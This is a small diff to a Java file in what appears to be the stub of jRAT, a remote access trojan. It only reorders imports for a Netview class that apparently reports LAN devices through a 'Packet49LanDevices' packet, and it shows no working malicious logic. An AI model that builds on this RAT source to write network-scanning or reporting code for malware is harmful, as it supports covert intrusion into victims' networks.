@@ -1,11 +1,9 @@
 package io.jrat.stub;
 
 import io.jrat.stub.packets.outgoing.Packet49LanDevices;
-
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-
-import com.redpois0n.oslib.OperatingSystem;
+import oslib.OperatingSystem;
 
 
 public class Netview extends Thread {
